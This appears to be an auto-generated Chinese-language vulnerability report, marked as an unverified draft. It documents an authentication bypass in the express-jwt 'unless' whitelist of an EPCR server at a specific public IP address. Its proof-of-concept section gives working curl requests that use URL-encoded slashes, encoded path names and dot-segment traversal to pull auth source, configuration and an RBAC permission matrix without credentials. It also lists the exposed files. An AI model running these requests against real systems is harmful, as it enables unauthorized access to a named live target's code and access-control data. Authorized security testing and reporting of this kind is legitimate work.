# POC/EXP — URL 编码/路径遍历绕过 express-jwt unless 漏匹配白名单 

> 漏洞ID: `79ec6fd8-e874-4394-ba72-58d690e7f0df`  | 嚴重度: **high** | 狀態: open | 目標: `http://35.234.50.28:8000 (EPCRServer v1.5.24948) 与 http://35.234.50.28:3001 (statUrl)`

**類型**: 信息泄露 + 鉴权绕过 + 路径规范化绕过

## 描述

8000 EPCRServer 静态资源未授权完整披露：express-jwt unless 漏匹配白名单路径规范化绕过。攻击者无需认证即可访问 /js/&lt;file&gt; 路径下所有 JS 文件, 泄露完整鉴权源码、RBAC权限矩阵、敏感配置信息。多个绕过技术被确认：URL编码 /js%2F&lt;file&gt;、URL编码整个 /js (%6A%73)、路径穿越 /js/../js/&lt;file&gt;、dot segment /js/./&lt;file&gt;、跨目录 dot segment /images/../js/&lt;file&gt;。审计追踪绕过(WAF/日志看到的URL与实际响应路径不一致)。

## POC / 復現步驟

```
# 漏洞证据 1: URL 编码 / 绕过
curl -i 'http://35.234.50.28:8000/js%2FauthInterceptorConfig.config.js'
HTTP/1.1 200 OK
Content-Length: 2650
... (完整 4195B AuthService.js + 2650B authInterceptorConfig.config.js)

# 漏洞证据 2: URL 编码整个 /js 绕过
curl -i 'http://35.234.50.28:8000/%6A%73/authInterceptorConfig.config.js'
HTTP/1.1 200 OK
Content-Length: 2650

# 漏洞证据 3: 路径穿越 dot segment 绕过
curl -i 'http://35.234.50.28:8000/js/../js/authInterceptorConfig.config.js'
HTTP/1.1 200 OK
Content-Length: 2650

# 已验证可访问文件 8000 (7 个):
- authInterceptorConfig.config.js (2650B) - 含 $injector.invoke 表达式注入 CWE-285
- AuthService.js (4195B) - 完整鉴权源码含 jwtHelper.decodeToken + checkPerm
- services.js (3794B) - 完整服务层代码
- app.js (31555B) - 应用入口含 whiteListedDomains + tokenGetter 注入
- LoginCtrl.js (1136B)
- LogoutCtrl.js (94B)
- WholeBodyCtrl.js (159B)

# 已验证可访问文件 3001 (8 个, 多了 permissionlist.js):
- permissionlist.js (4873B) - 完整 RBAC 矩阵 13角色 × 60+权限
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
